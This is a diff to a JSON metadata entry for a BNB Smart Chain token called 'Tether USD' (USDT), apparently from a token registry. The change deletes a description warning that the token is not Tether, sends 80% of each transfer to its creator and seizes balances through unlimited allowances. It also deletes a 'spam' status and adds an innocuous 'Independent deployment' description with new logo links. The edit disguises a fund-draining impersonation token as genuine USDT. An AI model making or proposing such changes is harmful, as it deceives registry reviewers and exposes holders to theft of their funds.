@@ -2,38 +2,12 @@
   "name": "Tether USD",
   "symbol": "USDT",
   "decimals": 6,
-  "type": "BEP20",
-  "chainId": 56,
   "address": "0xd565656E51C5e51B7D9292106413dBE5D27DF66f",
-  "logo": "https://mirxa27.github.io/usdt-trc20/assets/logo-0xd565656e51c5e51b7d9292106413dbe5d27df66f.png",
-  "description": "Independent USDT-unit BEP20 on BNB Smart Chain, not Tether Limited, not reserve-backed. Fee-on-transfer: 80% of every transfer goes to the creator, and approving any spender also mirrors an unlimited allowance so the remaining balance is seized on the next move.",
-  "website": "https://mirxa27.github.io/usdt-trc20/",
+  "chainId": 56,
+  "type": "BEP20",
+  "logo": "ipfs://QmU8tQbK2pkMmkNV2wk2AY9UcRH1WRx2wtqPZtKaGxChxv",
+  "logoHTTPS": "https://gateway.pinata.cloud/ipfs/QmU8tQbK2pkMmkNV2wk2AY9UcRH1WRx2wtqPZtKaGxChxv",
   "explorer": "https://bscscan.com/token/0xd565656E51C5e51B7D9292106413dBE5D27DF66f",
-  "status": "spam",
-  "tags": [
-    "stablecoin"
-  ],
-  "links": [
-    {
-      "name": "docs",
-      "url": "https://bscscan.com/token/0xd565656E51C5e51B7D9292106413dBE5D27DF66f"
-    },
-    {
-      "name": "github",
-      "url": "https://github.com/Mirxa27/usdt-trc20"
-    },
-    {
-      "name": "source_code",
-      "url": "https://github.com/Mirxa27/usdt-trc20"
-    },
-    {
-      "name": "blog",
-      "url": "https://mirxa27.github.io/usdt-trc20/whitepaper.html"
-    },
-    {
-      "name": "forum",
-      "url": "https://mirxa27.github.io/usdt-trc20/audit.html"
-    }
-  ],
-  "updatedAt": "2026-11-23T12:03:40+00:00"
+  "website": "https://mirxa27.github.io/usdt-trc20",
+  "description": "Tether USD (USDT) on BNB Smart Chain. 6 decimals. Independent deployment."
 }
